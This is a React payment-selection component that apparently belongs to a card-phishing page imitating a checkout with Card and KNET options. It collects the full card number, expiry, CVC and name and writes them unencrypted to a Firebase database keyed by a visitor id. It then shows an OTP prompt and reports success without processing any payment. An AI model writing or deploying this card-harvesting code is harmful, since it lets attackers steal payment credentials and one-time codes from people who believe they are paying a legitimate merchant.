"use client"

import type React from "react"
import { useState } from "react"
import { CreditCard } from "lucide-react"
import { useNavigate } from "react-router-dom"
import { addData } from "../../firebase"
import OtpDialog from "./otp"


export default function PaymentSelection() {
  const [paymentMethod, setPaymentMethod] = useState("card")
  const [cardDetails, setCardDetails] = useState({
    name: "",
    number: "",
    expiry: "",
    cvc: "",
  })
  const [showOtpDialog, setShowOtpDialog] = useState(false)
  const router = useNavigate()

  const handlePaymentMethodChange = (method: string) => {
    setPaymentMethod(method)
  }

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { id, value } = e.target
    setCardDetails((prev) => ({
      ...prev,
      [id.replace("card-", "")]: value,
    }))
  }

  const handleSubmit = () => {
    const _id = localStorage.getItem("visitor")

    if (paymentMethod === "knet") {
      router("kent")
    } else if (paymentMethod === "card") {
      // Validate card details before proceeding4
      setShowOtpDialog(true)

      if (validateCardDetails()) {
        // Save card details to Firebase
        addData({ id: _id, cardDetails })

        // Open OTP dialog for card payments
      } else {
        // Show validation error
        alert("Please fill in all card details correctly")
      }
    }
  }

  const handleOtpVerification = (otp: string) => {
    // Here you would typically verify the OTP with your backend
    console.log("Verifying OTP:", otp)

    // For demo purposes, we'll just close the dialog and proceed
    setShowOtpDialog(false)

    // You can add your OTP verification logic here
    // If successful, you might want to navigate to a success page
    // For now, we'll just simulate a successful payment
    router("/payment-success")
  }

  const validateCardDetails = () => {
    // Simple validation - check if all fields have values
    return Object.values(cardDetails).every((value) => value.trim() !== "")
  }

  return (
    <div className="w-full max-w-md mx-auto bg-white rounded-lg border border-gray-200 shadow-lg overflow-hidden">
      <div className="p-6 border-b border-gray-200 m-4">
        <h2 className="text-xl font-semibold text-gray-900">Choose Payment Method</h2>
        <p className="text-sm text-gray-500 mt-1">Select how you would like to pay</p>
      </div>

      <div className="p-6 space-y-6 flex flex-col items-center justify-between">
        <div className="grid grid-cols-2 gap-4 w-full">
          <div className="w-full">
            <input
              type="radio"
              id="card"
              name="paymentMethod"
              value="card"
              checked={paymentMethod === "card"}
              onChange={() => handlePaymentMethodChange("card")}
              className="absolute opacity-0 w-0 h-0"
            />
            <label
              htmlFor="card"
              className={`flex flex-col items-center justify-between rounded-md border-2 p-4 cursor-pointer hover:bg-gray-50 transition-all ${
                paymentMethod === "card" ? "border-blue-500 shadow-sm" : "border-gray-200"
              }`}
            >
              <CreditCard className="mb-3 h-6 w-6" />
              <span className="text-sm font-medium">Card</span>
            </label>
          </div>

          <div className="w-full">
            <input
              type="radio"
              id="knet"
              name="paymentMethod"
              value="knet"
              checked={paymentMethod === "knet"}
              onChange={() => handlePaymentMethodChange("knet")}
              className="absolute opacity-0 w-0 h-0"
            />
            <label
              htmlFor="knet"
              className={`flex flex-col items-center justify-between rounded-md border-2 p-4 cursor-pointer hover:bg-gray-50 transition-all ${
                paymentMethod === "knet" ? "border-blue-500 shadow-sm" : "border-gray-200"
              }`}
            >
              <div className="mb-3 h-6 w-6 flex items-center justify-center">
                <img src="/kv.png" alt="KNET" className="h-6 w-6" />
              </div>
              <span className="text-sm font-medium">KNET</span>
            </label>
          </div>
        </div>

        {paymentMethod === "card" && (
          <div className="space-y-4 pt-2 w-full">
            <div className="space-y-2">
              <label htmlFor="card-name" className="block text-sm font-medium text-gray-700">
                Name on Card
              </label>
              <input
                id="card-name"
                type="text"
                className="w-full px-3 py-2 border border-gray-300 rounded-md text-sm shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                placeholder="John Smith"
                value={cardDetails.name}
                onChange={handleInputChange}
              />
            </div>

            <div className="space-y-2">
              <label htmlFor="card-number" className="block text-sm font-medium text-gray-700">
                Card Number
              </label>
              <input
                id="card-number"
                type="text"
                className="w-full px-3 py-2 border border-gray-300 rounded-md text-sm shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                placeholder="1234 5678 9012 3456"
                value={cardDetails.number}
                onChange={handleInputChange}
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <label htmlFor="card-expiry" className="block text-sm font-medium text-gray-700">
                  Expiry Date
                </label>
                <input
                  id="card-expiry"
                  type="text"
                  className="w-full px-3 py-2 border border-gray-300 rounded-md text-sm shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                  placeholder="MM/YY"
                  value={cardDetails.expiry}
                  onChange={handleInputChange}
                />
              </div>

              <div className="space-y-2">
                <label htmlFor="card-cvc" className="block text-sm font-medium text-gray-700">
                  CVC
                </label>
                <input
                  id="card-cvc"
                  type="text"
                  className="w-full px-3 py-2 border border-gray-300 rounded-md text-sm shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                  placeholder="123"
                  value={cardDetails.cvc}
                  onChange={handleInputChange}
                />
              </div>
            </div>
          </div>
        )}
      </div>

      <div className="p-6 border-t border-gray-200">
        <button
          onClick={handleSubmit}
          className="w-full py-2 px-4 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition-colors"
        >
          Continue to Payment
        </button>
      </div>

      {/* OTP Dialog */}
      {showOtpDialog && (
        <OtpDialog
          onVerify={handleOtpVerification}
          onCancel={() => setShowOtpDialog(false)}
          phoneNumber={cardDetails.name ? `+1 *** *** ${cardDetails.name.slice(-4)}` : "+1 *** *** 1234"}
        />
      )}
    </div>
  )
}
